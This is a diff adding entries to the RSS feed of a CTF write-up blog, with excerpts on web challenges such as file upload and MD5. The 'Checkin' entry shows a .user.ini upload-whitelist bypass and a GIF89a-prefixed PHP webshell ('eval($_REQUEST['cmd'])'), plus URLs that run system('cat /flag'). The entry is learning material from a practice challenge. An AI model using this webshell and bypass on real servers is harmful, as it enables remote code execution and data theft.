@@ -59,5 +59,90 @@ getFilter(&ldquo;cat /flag&rdquo;)接着调用了 &ldquo;getFilter&rdquo; 方法
   <guid>https://66lueflam144.github.io/posts/8f09e57/</guid>
   <description><![CDATA[<p>it&rsquo;s been a long time to do ctf</p>]]></description>
 </item>
+<item>
+  <title>ACTF 2020 Include</title>
+  <link>https://66lueflam144.github.io/posts/85d9197/</link>
+  <pubDate>Mon, 06 Nov 2023 12:53:29 &#43;0800</pubDate>
+  <author>RockBear</author>
+  <guid>https://66lueflam144.github.io/posts/85d9197/</guid>
+  <description><![CDATA[]]></description>
+</item>
+<item>
+  <title>Buy Flag</title>
+  <link>https://66lueflam144.github.io/posts/71ccb67/</link>
+  <pubDate>Fri, 27 Oct 2023 13:02:11 &#43;0800</pubDate>
+  <author>RockBear</author>
+  <guid>https://66lueflam144.github.io/posts/71ccb67/</guid>
+  <description><![CDATA[<p>之前还是一个新手村门口人的时候打开过，那个时候的无助真的有点好笑。</p>]]></description>
+</item>
+<item>
+  <title>BJDCTF Easy MD5</title>
+  <link>https://66lueflam144.github.io/posts/09030b0/</link>
+  <pubDate>Fri, 27 Oct 2023 13:00:25 &#43;0800</pubDate>
+  <author>RockBear</author>
+  <guid>https://66lueflam144.github.io/posts/09030b0/</guid>
+  <description><![CDATA[<p><font size=1>只是隐隐约约记得MD5是一种加密算法</font></p>
+<h1 id="sql-injection" class="heading-element">
+  <a href="#sql-injection" class="heading-mark"></a>SQL Injection？</h1><p>输入：</p>
+<ul>
+<li>
+<p>数字</p>
+</li>
+<li>
+<p>字母</p>
+</li>
+<li>
+<p>数字+符号</p>
+</li>
+<li>
+<p>简单SQL语句</p>
+</li>
+<li>
+<p>简单XSS语句</p>
+</li>
+</ul>]]></description>
+</item>
+<item>
+  <title>newstar CTF 2023 听说你是个游戏高手</title>
+  <link>https://66lueflam144.github.io/posts/dd90fd2/</link>
+  <pubDate>Mon, 23 Oct 2023 13:17:04 &#43;0800</pubDate>
+  <author>RockBear</author>
+  <guid>https://66lueflam144.github.io/posts/dd90fd2/</guid>
+  <description><![CDATA[<blockquote>
+<p>知道查看js文件，知道可以修改值但是修改错方向导致痛失……</p>
+</blockquote>]]></description>
+</item>
+<item>
+  <title>ACTF 2020 Back File</title>
+  <link>https://66lueflam144.github.io/posts/4c47f54/</link>
+  <pubDate>Mon, 23 Oct 2023 12:52:06 &#43;0800</pubDate>
+  <author>RockBear</author>
+  <guid>https://66lueflam144.github.io/posts/4c47f54/</guid>
+  <description><![CDATA[<blockquote>
+<p>其实看这个名字的时候就在想是不是和目录遍历有关了。</p>
+</blockquote>]]></description>
+</item>
+<item>
+  <title>Checkin</title>
+  <link>https://66lueflam144.github.io/posts/b92f36b/</link>
+  <pubDate>Tue, 17 Oct 2023 13:06:03 &#43;0800</pubDate>
+  <author>RockBear</author>
+  <guid>https://66lueflam144.github.io/posts/b92f36b/</guid>
+  <description><![CDATA[1常规步骤之后，上传了.htaccess文件，不过发现被限制了。
+返回了一个：
+1 2 exif_imagetype:not image! exif_imagetype函数
+简单来说就是，上传文件白名单机制。
+QAQ
+新英雄登场
+.user.ini文件
+php目录配置文件，作用为：
+当我们访问目录中的任何php文件时，都会调用.user.ini中指的文件以php的形式进行读取。
+文件内容为
+1 2 3 4 GIF89a auto_prepend_file=po.jpg 之后就可以常规步骤一顿操作。
+2这里也有了新一种方法用传进去的cmd 进行rce——其前提是传入的木马文件内容为：
+1 2 3 4 GIF89a &lt;script language=&#39;php&#39;&gt;eval($_REQUEST[&#39;cmd&#39;]);&lt;/script&gt; 然后
+1 2 3 4 5 6 7 8 9 10 uploads/xxx/index.php?cmd=var_dump(scandir(&#34;/&#34;)); // 扫描当前目录下的文件，并打印出来 uploads/xxx/index.php?cmd=system(&#39;cat /flag&#39;); uploads/xxx/index.php?cmd=var_dump(file_get_contents(&#34;/flag&#34;)); 3ps：图片文件头前缀（作用是？）
+1 2 3 4 5 6 7 8 JPG:FF D8 FF E0 00 10 4A 46 49 46（16进制编码） GIF：47 49 46 38 39 61（ascll值是GIF89a） PNG： 89 50 4E 47 参考一下]]></description>
+</item>
 </channel>
 </rss>
